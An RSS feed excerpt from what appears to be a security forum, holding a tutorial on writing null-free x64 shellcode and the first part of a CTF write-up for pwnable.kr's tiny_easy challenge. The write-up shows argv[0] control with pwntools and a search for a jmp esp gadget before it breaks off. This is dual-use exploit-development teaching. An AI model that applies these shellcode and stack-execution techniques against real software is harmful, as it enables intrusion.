  mov rax, SYS_READ

  syscall

  

  ; syscall write to stdout

  mov rdi,1 ; set stdout fd = 1

  mov rdx, rax ; write to stdout the amount of bytes read

  mov rax, SYS_WRITE

  syscall

  mov rax, SYS_EXIT

  syscall ; finish execution

; jump here in order to get the address of the string

get_file_path:

call continue 

file_path: db "/tmp/my_file", 0

</code></pre>
<p>This code performs a simple task, it reads 16 bytes from the file located in<br>
/tmp/my_file and outputs those bytes to stdout.</p>
<p>Notice the cool trick we implemented in order to obtain the string that contains the path to the file.<br>
to get that address, we perform a call to a label near that string called get_file_path,<br>
afterwards we immediately perform a second call to the continue label that brings us  back to the rest of our shellcode.</p>
<p>Because the second call was invoked, the address to return to after the second call now points to the string, because that is the first “instruction” after the call instruction. we then pop that address to RDI so that  RDI (the first param in x64 syscall conventions) can point to the string of the file we wish to open</p>
<p>You can compile it the above assembly code by running</p>
<pre><code class="lang-auto">
path_to_make_shellcode_ /make_shellcode_linux/make_shellcode.sh/ ./printf_file.asm 64

</code></pre>
<p>and run it using</p>
<pre><code class="lang-auto">
path_to_shellrun/shellrun ./print_file.bin

</code></pre>
<p>Let’s check if the shellcode works properly</p>
<pre><code class="lang-auto">
echo “this_is_my_data” &gt; /tmp/my_file

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png" data-download-href="/uploads/short-url/yxHNvMgE8MnJeWgMH29LCH37cSZ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_672x35.png" alt="" data-base62-sha1="yxHNvMgE8MnJeWgMH29LCH37cSZ" width="672" height="35" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_672x35.png, /uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png 1.5x, /uploads/default/original/2X/f/f2195243f4d3cedad398795120a279ba6b85c819.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f2195243f4d3cedad398795120a279ba6b85c819_2_10x10.png"></a></strong></div><p></p>
<p>So far so good.</p>
<p>But under the surface, hids a horrible secret…</p>
<p>It’s full of null bytes!!!</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03.png" data-download-href="/uploads/short-url/4dYyZJBXQNqb3wxlfEAj5RIz8FJ.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03.png" alt="" data-base62-sha1="4dYyZJBXQNqb3wxlfEAj5RIz8FJ" width="602" height="101" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d9d2971ddb9588af953bec1666b89fc0a729a03_2_10x10.png"></a></strong></div><p></p>
<p>Hexdump just showed us that this shellcode is riddled with null bytes,</p>
<p>Let’s begin our work at curing this code by going over the correct ways to bypass situations where instructions generate null bytes</p>
<p>I will show the opcodes of the instruction  on the left side<br>
and the instruction itself on the right side</p>
<p>Note:I’ll be using <a href="https://defuse.ca/online-x86-assembler.htm" rel="noopener nofollow ugc">this website</a>  in order to show the bytes generated from the instructions were about to show. I recommend to you all to test your instruction combinations there.</p>
<h2>Method 1: Math is awesome</h2>
<p>I’ll start of by saying that the mov instruction is many times obsolete when you have the power of math at your side</p>
<h3>Loading 0 to a register</h3>
<h4>Bad way:</h4>
<p>Lets look at the following instruction:</p>
<pre><code class="lang-auto">48 c7 c0 00 00 00 00   mov rax, 0 

</code></pre>
<p>it is 7 bytes long and more importantly, contains 4 null bytes!</p>
<p>we can easily use the following instructions instead</p>
<h4><strong>Good way:</strong></h4>
<pre><code class="lang-auto">48 31 c0    xor rax, rax

</code></pre>
<pre><code class="lang-auto">48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff
48 ff c0                inc    rax
</code></pre>
<p>in case the value of rbx is 0, we can execute this instruction.<br>
(this can also be done with any other register with a 0 value)</p>
<pre><code class="lang-auto">
48 f7 e3    mul rbx 

</code></pre>
<p>The mul instruction will multiply rax with the contents of rbx and store it in rax</p>
<p>because rbx is 0 in this case then 0 will also be stored in rax</p>
<h3>**Loading large values to registries **</h3>
<p>What about putting large values in registries? For example, if i wanted to read a big file with my shellcode.</p>
<h4>Bad way</h4>
<pre><code class="lang-auto">
48 c7 c2 00 00 01 00    mov    rdx,0x10000

</code></pre>
<h4>Good way</h4>
<p>You can use the shift operations in order to load large numbers</p>
<pre><code class="lang-auto">48 31 d2               xor    rdx,rdx
48 83 c2 02            add    rdx,0x2
48 c1 e2 0f            shl    rdx,0xf

</code></pre>
<p>This will result in rdx having the value 0x10000 at the end of the shift operation.</p>
<h2>Method 2: Using your lower parts</h2>
<p>Before you start thinking dirty, different parts of each register in x64 can be accessed as an operand.</p>
<p>These parts are mapped in the following way:</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/5536ef497f7c6038025eb58e01735580bf44f548.png" data-download-href="/uploads/short-url/c9QhuhPRmtb0tmrTgosixKFviJ2.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_602x391.png" alt="" data-base62-sha1="c9QhuhPRmtb0tmrTgosixKFviJ2" width="602" height="391" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_602x391.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_903x586.png 1.5x, /uploads/default/original/2X/5/5536ef497f7c6038025eb58e01735580bf44f548.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5536ef497f7c6038025eb58e01735580bf44f548_2_10x10.png"></a></strong></div><p></p>
<p>This allows us to use the al operand for example instead of the rax operand when we want to perform reading and writing actions on the lower 8 bits of the rax register.</p>
<p>When we do so, the instruction that is executed is much smaller and can also aid us when trying to avoid null bytes.</p>
<h4>**Bad way:</h4>
<pre><code class="lang-auto">48 c7 c0 02 00 00 00    mov    rax,0x2
48 c7 c3 ff 0f 00 00    mov    rbx,0xfff

</code></pre>
<h4>Good way</h4>
<pre><code class="lang-auto">48 31 db              xor    rbx,rbx
48 31 c0              xor    rax,rax
b0 02                 mov    al,0x2
66 bbff 0f            mov    bx,0xfff

</code></pre>
<h2>Field Test</h2>
<p>After we learned these two new methods, let’s implement and modify the assembly code we saw at the beginning of the article</p>
<pre><code class="lang-auto">
SYS_READ equ 0

SYS_WRITE equ 1

SYS_OPEN equ 2

SYS_EXIT equ 60

AMOUNT_TO_READ equ 16

global _start

section .text

_start:

  jmp get_file_path 

  continue:

  

  ; syscall to open the file

  xor rax, rax

  add al, SYS_OPEN

  pop rdi ; pop address of string to rdi

  xor rsi, rsi ; set O_RDONLY flag

  syscall

    

  ; syscall read file

  sub sp, 0xfff

  lea rsi, [rsp]

  mov rdi, rax

  xor rdx, rdx

  add dl, AMOUNT_TO_READ; amount to read

  xor rax, rax

  syscall

    

  ; syscall write to stdout

  xor rdi, rdi

  add dl, 1 ; set fd to point to stdout

  mov rdx, rax

  xor rax, rax

  add al, SYS_WRITE

  syscall

  

  mov al, SYS_EXIT

  syscall ; finish execution

; jump here in order to get the address of the string  

get_file_path:

call continue

flag: db "/tmp/my_file", 0

</code></pre>
<p>After we compile this code, we can run it and see that it works exactly the same as the previous code:</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png" data-download-href="/uploads/short-url/euFqMCb8VDTxOfbiEyiLZRPYZNe.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_651x33.png" alt="" data-base62-sha1="euFqMCb8VDTxOfbiEyiLZRPYZNe" width="651" height="33" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_651x33.png, /uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png 1.5x, /uploads/default/original/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6595ec29524e6471d72c9cb1d0fad77677ee2050_2_10x10.png"></a></strong></div><p></p>
<p>let’s see if hexdumps finds any null bytes…</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1.png" data-download-href="/uploads/short-url/24VXKqKsKHyojfJqeNmzK90LLs5.png?dl=1" title=""><img src="/uploads/default/original/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1.png" alt="" data-base62-sha1="24VXKqKsKHyojfJqeNmzK90LLs5" width="641" height="101" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0e9327cbd0bbe0fafc95c009c7f9982a772d1cf1_2_10x10.png"></a></strong></div><p></p>
<p>Awesome!</p>
<p>Note: Don’t be confused by the one null byte that hexdump found, that null byte belongs to the string in our shellcode and it’s placed at the end of the shellcode.<br>
It doesn’t seem like it is in the end because memory is saved in <a href="https://www.youtube.com/watch?v=seZLUbgbB7Y" rel="noopener nofollow ugc">little endian</a>.</p>
<h2>Conclusions</h2>
<p>Today we learned about how we can compile our shellcode to be free of null bytes. We learned along the way about different ways we can perform the same resulting actions using different and sometimes shorter instructions(opcode wise) in x64.</p>
<p>Finally, we used this knowledge to transform shellcode that was riddled with null bytes into one that is ready to tackle any strcpy in it’s path.</p>
<p>I hope you all enjoyed this article and learned more about the x64 instruction set along the way, there are many more methods and techniques yet to learn and I urge you all to keep learning what you don’t know and teach what you do know.</p>
<p>Spread the good word,</p>
<p>x24whoamix24</p>
<h2><strong>Sources</strong></h2>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">filippo.io</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">Searchable Linux Syscall Table for x86 and x86_64 | PyTux</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener nofollow ugc">defuse.ca</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener nofollow ugc">Online x86 and x64 Intel Instruction Assembler</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/null-terminated-programming-101-x64/20398">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/null-terminated-programming-101-x64/20398</link>
          <pubDate>Thu, 09 Apr 2020 18:45:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20398</guid>
          <source url="https://d.clarkee.co.uk/t/null-terminated-programming-101-x64/20398.rss">Null Terminated Programming 101 - x64</source>
        </item>
        <item>
          <title>Exploit Development - The Magic in Hacking</title>
          <dc:creator><![CDATA[x24whoami24]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <h1>The Magic in Hacking</h1>
<p>While wandering around the various amazing topics in this forum, I noticed a lack of one of the subjects I enjoy the most - exploit development (last post was more than a month ago).</p>
<p>I decided to write my own post about the subject which will also be my first post in this forum.</p>
<p><strong>What we will go over in this article:</strong></p>
<p>My experience in exploit development</p>
<p>Go over a CTF from <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> step by step as we solve it.</p>
<p>Explain different tools i use for  and how i implemented them to solve this challenge</p>
<p><strong>Recommended Pre-requisites:</strong></p>
<ul>
<li>
<p>Basic Linux understanding</p>
</li>
<li>
<p>X86 assembly knowledge</p>
</li>
<li>
<p>Knowledge of how the stack works</p>
</li>
<li>
<p>Basic C language</p>
</li>
<li>
<p>understanding of Basic buffer overflow exploits</p>
</li>
<li>
<p>Basic development in python</p>
</li>
</ul>
<hr>
<h1>A Song of Bytes and Shells</h1>
<p>Ever since I was a kid I was intrigued with exploits. when I was around 16 and started developing malware but i always felt that while malware was something i could understand and learn how to do well, exploits were always something of a mystery to me  . I remember once, when i at home with my older brother who was much more knowledgeable than me at the time  and I asked him for the first time what exploits were after I heard about that term so many times.</p>
<p>He said to me: “exploits are where magic happens in hacking”</p>
<p>Ever since then many winters have passed, the boy i was became a man and with it i learned more and more about the subject. I started working professionally in the field of exploit research and developed many exploits and shellcode galleries of my own. I realized how exploits are an artform of their own, they require the highest level of professionalism because a lot of the time you need a combination of various fields<br>
(for example: C language, assembly, understanding of the heap and stack, python for development the exploit)  in order to make an exploit and that is just the tip of iceberg.</p>
<p>This can be very daunting for a someone who wants to enter the field of exploit development as it is a  zero sum game.</p>
<p>As Cersei Lannister described accurately :</p>
<pre><code> “When you play the game of Exploits, you pwn or you crash. There is no middle ground.”
</code></pre>
<p>I hope in this article that i can help ease people in to the subject and tools using<br>
one of my favorite CTF challenge.</p>
<hr>
<h1>Don’t judge a binary by its size</h1>
<p>Today we will analyze a CTF from one of my most favourite CTF websites - <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a></p>
<p><a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> is an amazing site for anyone wishing to try out hard exploitation and reverse engineering challenges.</p>
<p>I found all kinds of exploit challenges there, from memory corruptions to command injections and up to kernel write exploits and race conditions.</p>
<p>Highly recommend you all to check it out.</p>
<p>For this article I decided to go over the tiny_easy challenge.</p>
<p><strong><img src="/uploads/default/original/2X/a/a16ec6a92f82cfc63c3f85071e890ce88f32c95b.png" alt="" data-base62-sha1="n26cYqyCR53XkI36iOElEf2C4rN" width="201" height="303"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/def6156eb0ba3236b02e0e1a8e7b4ad4359c5c22.png" alt="" data-base62-sha1="vOpehzHWSNTUyp1iwKhAolg9taG" width="475" height="316"></strong></p>
<p>Let’s SSH inside!</p>
<pre><code class="lang-auto">
ssh [tiny_easy@pwnable.kr](mailto:tiny_easy@pwnable.kr) -p2222

</code></pre>
<p>(For windows users i highly recommend <a href="https://mobaxterm.mobatek.net/" rel="noopener nofollow ugc">mobaxterm</a>, it’s an easy software you can use to handle ssh sessions and download software easily)</p>
<p>Inside the ssh, we run “ls” and find only a binary and our flag file which we can’t read as we don’t have any permissions</p>
<p><strong><img src="/uploads/default/original/2X/a/a60ffb507e6705e26b3737343378bc624be60328.png" alt="" data-base62-sha1="nH3v2MaKux408rv6fNGF47k3WqI" width="602" height="200"></strong><br>
Let’s download the binary and perform some  checks on it:<br>
well start off with the “file” command.</p>
<p>This command gives us details about the binary including it’s architecture, bitness(x64 vs x32) and other nice details</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" data-download-href="/uploads/short-url/pXyMsWCglvGaKPrvfA7yteKtdE4.png?dl=1" title=""><img src="/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" alt="" data-base62-sha1="pXyMsWCglvGaKPrvfA7yteKtdE4" width="602" height="37" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560_2_10x10.png"></a></strong></div><p></p>
<p>We can see from this output that the file is a 32-bit ELF file for the x86 architecture and it’s statically linked.</p>
<p>But wait…</p>
<p><strong><img src="/uploads/default/original/2X/4/48c2740844f8f3f2c7b4de307c4d13d9361dc2fe.png" alt="" data-base62-sha1="anEZvphLOU8pUptspa5CvSGpPT8" width="416" height="32"></strong></p>
<p>Lets try to run the binary and see what happens :</p>
<p><strong><img src="/uploads/default/original/2X/0/097ce7cb708859b49020d79e35dd3a6136390a49.png" alt="" data-base62-sha1="1lVUamCj6dM3X8ujNmy78XLvEmZ" width="562" height="38"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/d3a5d2d7701d2fa56ad16369ce191af201e72dd8.png" alt="" data-base62-sha1="uck1ln3PuWhfOhYKbA4kPQXauUM" width="330" height="214"></strong></p>
<p>As seen by the fact that the binary has a corrupted header and crashes on execution, we can understand that we may be in for a bit different binary than what we usually see.</p>
<p>Lets open the binary in ida and go over the code</p>
<p><strong><img src="/uploads/default/original/2X/5/551dfdfd41e73ca3508847b32692bc5f8b583cae.png" alt="" data-base62-sha1="c8YQfY3O87vAZGh4bLUUoKJ3huK" width="453" height="150"></strong></p>
<p>Wow! Look at that! this has to be the smallest CTF i’ve ever looked at <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>The whole program has only 4 instructions.</p>
<p>We perform two pops from the stack. Takes the value from where edx points to and then jumps to it.</p>
<p>But wait… there aren’t any calls in this program so which values are poped from the stack?</p>
<p>Let’s use gdb and check it out!</p>
<p>In this article i used gdb with the <a href="https://github.com/longld/peda" rel="noopener nofollow ugc">peda</a> extension that makes debugging much easier.</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png" data-download-href="/uploads/short-url/qLEKfjXQa7TykTwe3C0EZkpSUhW.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png" alt="" data-base62-sha1="qLEKfjXQa7TykTwe3C0EZkpSUhW" width="602" height="359" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 1.5x, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_10x10.png"></a></strong></div><p></p>
<p>Having a look at the stack, we see that eax will receive the value 1 and edx will receive a pointer to the string</p>
<p>“/home/user/CTFs/Pwnables/tiny_easy/tiny_easy”</p>
<p>That is the path to our binary!</p>
<p>If we continue stepping until the call to edx, we see the reason why we received our segfault earlier</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png" data-download-href="/uploads/short-url/sH8XfWPU1vYtcL7EMKDReLPJt3K.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png" alt="" data-base62-sha1="sH8XfWPU1vYtcL7EMKDReLPJt3K" width="602" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 1.5x, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_10x10.png"></a></strong></div><p></p>
<p>The program attempts to jump to the address 0x6d6f682f which is value for the string “/hom”. A part of the path to our binary</p>
<p>Let’s try to run our program with the parameters test1 test2 test3</p>
<p>We can do this by running the command in gdb</p>
<pre><code class="lang-auto">
run test1 test2 test3 

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png" data-download-href="/uploads/short-url/kdQ2cVASsWf2AMEYp1RfL3HwG71.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png" alt="" data-base62-sha1="kdQ2cVASsWf2AMEYp1RfL3HwG71" width="602" height="280" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 1.5x, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_10x10.png"></a></strong></div><p></p>
<p>As we can see, the stack has changed, now we have our parameters in the stack and the value at the top of the stack has changed from 0x1 to 0x4.</p>
<p>Remember in the C language, how the main function receives input?</p>
<pre><code class="lang-auto">
Int main(int argc, char * argv [], char * envp)

</code></pre>
<p>argv[0]  in main always points to the path of the current binary and then argv[1]</p>
<p>argv[2] and so forth will contain our arguments.</p>
<p>In order to successfully jump where we want, we need to have control over argv[0] because the program will jump to the value in it.</p>
<p>How can we control over argv[0] if it isn’t one of our parameters?</p>
<p>Introducing <a href="http://docs.pwntools.com/en/stable/" rel="noopener nofollow ugc">pwnlib</a>!</p>
<p>Pwnlib is a python library that allows us to easily communicate with sockets and processes for the sake of pwning them.</p>
<p>The pwnlib.tubes.process  allows us to create a process of our own and control it’s different arguments (argv, envp) and so forth.</p>
<p>Just to show you an example of the use of pwnlib, i compiled the following code snippet:</p>
<pre><code class="lang-auto">
int main(int argc, char * argv[])

{


    printf("\nthis is our argv[0] %s\n", argv[0]);

}

</code></pre>
<p>We compile and run it and get the following result:</p>
<p><strong><img src="/uploads/default/original/2X/d/da97410ec0a3167b099e893ad1a6910965f3fe75.png" alt="" data-base62-sha1="vbK9eUlJr2ajvFwUYMWQr5aBI4R" width="434" height="87"></strong></p>
<p>Let’s use pwnlib to manipulate the argv[0] to our own string</p>
<pre><code class="lang-auto">
from pwnlib.tubes.process import * 

argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")

print argv_program.recv()

</code></pre>
<p>Now lets run our python program and see what result we received from the test_argv program:</p>
<p><strong><img src="/uploads/default/original/2X/2/2c8474e29da91c1ad841a3bfa87a9e819ba3b884.png" alt="" data-base62-sha1="6lONkmt7V095qYoPkcF76WCikQc" width="391" height="67"></strong></p>
<p>Great!</p>
<p>We now know how to have control over argv0, this means we can jump anywhere we want in the tiny_easy binary.</p>
<p>Our next step is checking what mitigations does this binary have.</p>
<p>Let’s run <a href="https://github.com/slimm609/checksec.sh" rel="noopener nofollow ugc">checksec</a> and see.</p>
<p><strong><img src="/uploads/default/original/2X/a/a8a74cd88de9588f8a594cc0b297d145165f0182.png" alt="" data-base62-sha1="o3YEy2tbw1i52WlZyUVWSqrGfM6" width="590" height="131"></strong></p>
<p><strong>RELRO</strong>: No RELRO - no RELRO protection here  - Not relevant</p>
<p><strong>Stack</strong>: No stack canary is found here. Not relevant here but cool</p>
<p><strong>NX:</strong> NX disabled -  non executable protections is disabled, jackpot!</p>
<p>**PIE: **the code is not position independent - not relevant</p>
<p><strong>Note</strong>: By default, ASLR is enabled at stack level</p>
<p>NX protection is a protection which doesn’t allow us to run code only in the code sections of a binary. This means that we can’t jump to code on the stack or heap and run them.</p>
<p>In this example, we can see this binary is compiled without this protection which means we can possibly jump to our code on the stack.</p>
<p>I need to stress this out: <strong>checking for these kinds of protections straight in the beginning will save you a lot of time and frustration.</strong></p>
<p>In this example, because we can’t control the return address and NX is disabled then our best bet is to concentrate our effort of finding a way to jump to the stack and execute our shellcode that is stored in one of our parameters.</p>
<p>If on the other hand, NX was enabled then this means that we couldn’t jump to the stack and we needed to find a different way to run our code (ROP Gadgets, ret2libc, and many other methods)</p>
<p>Now that we can control where we can jump,we need to deal with the fact that ASLR is enabled at the stack level.</p>
<p>Let’s try to find an instruction that can allow us to jmp to the stack and thus run our shellcode.</p>
<p>The rest of the bytes in the program are part of the elf header</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png" data-download-href="/uploads/short-url/iHNk5STkr9zeVCzOsL1ZAEFkDZa.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png" alt="" data-base62-sha1="iHNk5STkr9zeVCzOsL1ZAEFkDZa" width="602" height="432" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_602x432.png, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 1.5x, /uploads/default/original/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/831a7ff08b49ffce7d9445878462d4b40c5336dc_2_10x10.png"></a></strong></div><p></p>
<p>We can also view these bytes an instructions in IDA using the “C” hotkey</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png" data-download-href="/uploads/short-url/8UcuIBPkv8V5LeJDAKS3KGnu3vm.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png" alt="" data-base62-sha1="8UcuIBPkv8V5LeJDAKS3KGnu3vm" width="602" height="427" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_602x427.png, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 1.5x, /uploads/default/original/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3e6bc4a8e587244a86512a5cd3759dbcc39615e4_2_10x10.png"></a></strong></div><p></p>
<p>Our best bet for an instruction to jump to is “jmp esp”</p>
<p>This will jump to the stack and from there we may be able to get to our shellcode that is stored in one of the parameters.</p>
<p>I like to perform my searches by hand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> so i used <a href="https://defuse.ca/online-x86-assembler.htm" rel="noopener nofollow ugc">online disassembling</a> to find what opcodes make up the jmp esp instruction.</p>
<p>If we try to disassemble jmp esp we get:</p>
<p>ff e3</p>
<p>Lets try to search this bytes in IDA using the search-&gt;sequence of bytes</p>
<p>And put in ff e3</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png" data-download-href="/uploads/short-url/hGsHQhN0xpyGKFHNXT62ZTI9SiQ.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png" alt="" data-base62-sha1="hGsHQhN0xpyGKFHNXT62ZTI9SiQ" width="602" height="145" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_602x145.png, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 1.5x, /uploads/default/original/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7bf1c3bd664e44889d5c08a946f36febcfc71c40_2_10x10.png"></a></strong></div><p></p>
<p>No result <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"></p>
<p>I tried searching for the bytes for call esp and didn’t find anything!</p>
<p>Now this is an interesting situation.</p>
<p>We want to jump to our code on the stack but we don’t know the address to jump to because of ASLR.</p>
<p>We tried to find an instruction that allows us to jmp to the stack without knowing it’s address but we didn’t find any.</p>
<p><strong>Another quick idea i tried:</strong></p>
<p>Jmp to an instruction that will allow you to write bytes to code section.</p>
<p>You can use this method to overwrite one of the instructions with the jmp esp opcodes to one of the addresses and then perform a jump to the instruction’s address.</p>
<p>It’s basically like driving a train that builds its tracks while it’s going and i liked the idea of this.</p>
<p>Unfortunately, i checked out the segment permissions to see what are the section permission using view-&gt;Open subviews-&gt;segments and found our the following</p>
<p><strong><img src="/uploads/default/original/2X/a/a86b067c22b1d8012685085d700560d06bed8fea.png" alt="" data-base62-sha1="o1TvYxTYUqcHwrekUpt58tP20ga" width="506" height="45"></strong></p>
<p>Only the R and X permissions are enabled for the code section</p>
